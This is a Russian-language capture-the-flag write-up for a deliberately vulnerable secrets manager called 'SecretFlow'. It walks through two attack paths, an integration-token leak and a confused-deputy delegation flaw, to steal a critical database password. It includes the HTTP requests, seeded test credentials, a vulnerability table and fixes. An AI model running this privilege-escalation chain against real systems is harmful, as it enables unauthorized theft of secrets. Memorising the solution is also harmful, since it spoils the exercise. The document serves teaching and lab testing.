# SecretFlow — Сценарии атак

## Обзор

Документ описывает реалистичные цепочки получения CRITICAL-секрета `PROD_DB_MASTER_PASSWORD`.

**Версия:** 2.0 (обновлено после security hardening)

---

## Изменения в версии 2.0

### Закрытые уязвимости
- **Path 2 (старый)**: Audit-Driven атака больше не работает
  - `/api/audit/logs` и `/api/audit/stats` теперь требуют роль `security_admin`
  - Токены больше не логируются в audit events
  - `/api/internal/integrations/status` больше не возвращает `auth_token`
  - `/api/internal/integrations/test/:id` возвращает только masked preview токена

### Новые уязвимости
- **Path 2 (новый, HARD)**: Confused Deputy + Trust Boundary Confusion

---

## Путь атаки 1: Утечка токена через internal status (MEDIUM)

**Сложность:** Средняя
**Требования:** Любой валидный пользователь

### Шаги

1. **Войти в приложение**
   - Учетные данные: `dev.alice` / `password123`

2. **Найти operational endpoint**
   - Через DevTools или перечисление API найти `/api/internal/integrations/status`
   - Эндпоинт доступен любому авторизованному пользователю

3. **Получить статус интеграций**
   ```
   GET /api/internal/integrations/status
   Authorization: Bearer <jwt>
   ```

4. **Извлечь webhook_url**
   - В ответе присутствует поле `webhook_url` для каждой интеграции
   - Это подсказка для следующего шага

5. **Найти ID CRITICAL-секрета**
   - Через `/api/secrets` или `GET /api/secrets`
   - Нужен ID `PROD_DB_MASTER_PASSWORD`

6. **Использовать интеграционный токен (полученный из другого источника)**
   ```
   POST /api/integrations/webhook
   Content-Type: application/json

   {
     "token": "gf_prod_abc123xyz789",
     "secret_id": "<uuid-prod-db-master-password>",
     "justification": "Automated deployment"
   }
   ```

7. **Получить значение секрета**
   - Ответ содержит `secret_value`

### Почему это работает

- Интеграционные токены хранятся в базе в открытом виде
- Webhook доверяет самому факту валидности токена
- Токен service account может быть использован для delegation-атаки (см. Path 2 HARD)

---

## Путь атаки 2: Confused Deputy + Trust Boundary (HARD)

**Сложность:** Высокая
**Требования:** Любой валидный пользователь + интеграционный токен

### Концепция уязвимости

Это **Trust Boundary Confusion** + **Confused Deputy** атака:
- Система доверяет service account'ам выдавать доступ к секретам
- Проверка scope происходит только для создателя токена
- Целевой пользователь (для которого создается грант) НЕ проверяется на наличие прав
- Атакующий может использовать украденный/найденный токен service account чтобы создать грант САМОМУ СЕБЕ

### Архитектурная ошибка

```
┌─────────────────────────────────────────────────────────────┐
│                    Trust Boundary                           │
│                                                             │
│  Service Account JWT (delegation endpoint)                  │
│         │                                                   │
│         ▼                                                   │
│  ┌─────────────────┐                                        │
│  │ Проверка:       │  ✅ JWT валиден                        │
│  │ - JWT signature │                                        │
│  │ - role = service_account                                 │
│  │ ❌ НЕТ ПРОВЕРКИ:                                          │
│  │    - allowed_secrets токена                              │
│  │    - allowed_environments                                │
│  │    - classification секрета                              │
│  └─────────────────┘                                        │
│         │                                                   │
│         ▼                                                   │
│  Создание гранта для ANY secret ← УЯЗВИМОСТЬ               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Шаги атаки

#### Шаг 1: Разведка — найти delegation endpoint

```
GET /api/delegate/info
Authorization: Bearer <jwt>
```

Ответ содержит подсказку о flow:
```json
{
  "delegation_info": {
    "description": "Service accounts can delegate access to users...",
    "flow": [
      "1. Obtain integration token from /api/internal/integrations/status",
      "2. Exchange integration token for service account JWT at /api/service-account/exchange",
      "3. Use service account JWT to call /api/delegate/access"
    ]
  }
}
```

#### Шаг 2: Получить интеграционный токен

**Вариант A:** Через Path 1 (если еще не получен)
```
GET /api/internal/integrations/status
Authorization: Bearer <jwt>
```

Изучить ответ, найти интеграцию и её токен (требуется дополнительный источник).

**Вариант B:** Использовать известный токен из seed-данных:
- `gf_prod_abc123xyz789` (production integration)

#### Шаг 3: Обменять интеграционный токен на service account JWT

```
POST /api/service-account/exchange
Content-Type: application/json

{
  "integration_token": "gf_prod_abc123xyz789",
  "purpose": "CI/CD debugging session"
}
```

Ответ:
```json
{
  "service_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "expires_at": "2026-04-01T15:04:05Z",
  "scope": "delegation"
}
```

**Важно:** Теперь у атакующего есть JWT от имени service account с ролью `service_account`.

#### Шаг 4: Получить ID своего пользователя

```
GET /api/auth/me
Authorization: Bearer <original-jwt>
```

Запомнить `user.id` для следующего шага.

#### Шаг 5: Создать грант САМОМУ СЕБЕ на CRITICAL-секрет

```
POST /api/delegate/access
Authorization: Bearer <service-account-jwt>
Content-Type: application/json

{
  "secret_id": "<uuid-prod-db-master-password>",
  "target_user_id": "<your-user-id>",
  "justification": "Temporary access for debugging",
  "duration_hours": 24
}
```

Ответ:
```json
{
  "grant_id": "uuid-grant",
  "secret_id": "uuid-secret",
  "user_id": "your-user-id",
  "expires_at": "2026-04-02T15:04:05Z",
  "delegated_by": "svc-delegate-uuid"
}
```

#### Шаг 6: Получить значение CRITICAL-секрета

```
GET /api/secrets/<uuid-prod-db-master-password>/value
Authorization: Bearer <original-jwt>
```

Ответ:
```json
{
  "secret": {
    "id": "uuid",
    "name": "PROD_DB_MASTER_PASSWORD",
    "value": "flag{...}"
  }
}
```

**🎯 Атака завершена успешно!**

### Почему это работает

1. **Trust Boundary Confusion:**
   - Endpoint `/api/delegate/access` доверяет JWT service account'а
   - Но НЕ проверяет, имеет ли этот service account право выдавать доступ к КОНКРЕТНОМУ секрету

2. **Confused Deputy:**
   - Service account выступает как "доверенное лицо"
   - Атакующий использует service account как посредника для получения прав
   - Service account "не понимает", что его используют для эскалации привилегий

3. **Отсутствие scope checks:**
   - В коде `delegate_service.go:DelegateAccess()` нет проверки:
     ```go
     // VULNERABILITY: Нет проверки!
     // - token.AllowedSecrets содержит req.SecretID?
     // - token.AllowedEnvironments содержит secret.Environment?
     // - service account имеет права на delegation secrets этой классификации?
     ```

### Dead Ends (тупики)

1. **Прямой вызов /api/delegate/access без service account JWT**
   ```
   POST /api/delegate/access
   Authorization: Bearer <user-jwt>  # role = developer
   ```
   Результат: `403 Insufficient Role` — требуется `service_account`

2. **Попытка делегирования на другого пользователя без токена**
   - Не получится — нужен валидный service account JWT

3. **Использование невалидного integration token**
   ```
   POST /api/service-account/exchange
   { "integration_token": "fake_token" }
   ```
   Результат: `401 Invalid integration token`

4. **Попытка получить токен из audit логов**
   - Больше не работает — токены маскируются в логах

### Learning Objectives

1. **Trust Boundaries:**
   - Понимать, что доверие должно быть ограничено контекстом
   - Service account с правами delegation должен иметь scope checks

2. **Confused Deputy Attack:**
   - Распознавать сценарии, где злоумышленник использует привилегированный компонент как посредника
   - Всегда проверять права как делегатора, так и получателя доступа

3. **Defense in Depth:**
   - JWT validation ≠ authorization
   - Need to check: signature, expiry, role, AND resource-level permissions

4. **Secure Delegation Patterns:**
   - Делегирование должно проверять:
     - Имеет ли делегатор права на этот ресурс
     - Может ли получатель иметь такие права (classification mismatch)
     - Не превышает ли делегирование исходные права делегатора

---

## Путь атаки 3: Internal API Misuse (DISABLED)

Endpoint'ы `/api/internal/secrets/grant` и `/api/internal/apply` отключены для CTF.

---

## Сводка уязвимостей

| ID | Уязвимость | CWE | Статус | Локация |
|----|------------|-----|--------|---------|
| V1 | Утечка токена в internal status | CWE-215 | ⚠️ ACTIVE | `GET /api/internal/integrations/status` |
| V2 | Токены в открытом виде | CWE-256 | ⚠️ ACTIVE | `integration_tokens` table |
| V3 | Нет строгого scope-контроля токена | CWE-284 | ⚠️ ACTIVE | `webhook_service.go` |
| V4 | Чувствительные данные в audit-логах | CWE-532 | ✅ FIXED | `audit_logs.details` |
| V5 | Обход классификации через automation flow | CWE-284 | ⚠️ ACTIVE | `approval_service.go` / webhook flow |
| V6 | Trust Boundary в delegation | CWE-284 | ⚠️ ACTIVE (HARD) | `delegate_service.go` |
| V7 | Missing auth on internal endpoint | CWE-306 | ✅ DISABLED | `internal.go` |

---

## Рекомендации по исправлению

### Для Path 1
1. Убрать endpoint `/api/internal/integrations/status` из публичного доступа
2. Требовать `security_admin` роль для просмотра интеграций
3. Хранить токены только в хешированном виде

### Для Path 2 (HARD)
1. Добавить проверку scope в `DelegateService.DelegateAccess()`:
   ```go
   // Проверить что service account имеет право на этот секрет
   if !tokenHasSecretAccess(token, secretID) {
       return ErrDelegationNotAllowed
   }
   ```
2. Проверять classification секрета против прав service account
3. Логировать все delegation события для аудита

### Общие рекомендации
1. Ввести принцип наименьших привилегий для service account'ов
2. Добавить rate limiting на чувствительные endpoint'ы
3. Внедрить детальный аудит всех операций с CRITICAL-секретами

---

## Флаг

**Цель:** Получить значение `PROD_DB_MASTER_PASSWORD`

**Успешный ответ:**
```json
{
  "access_granted": true,
  "secret_value": "flag{...}"
}
```
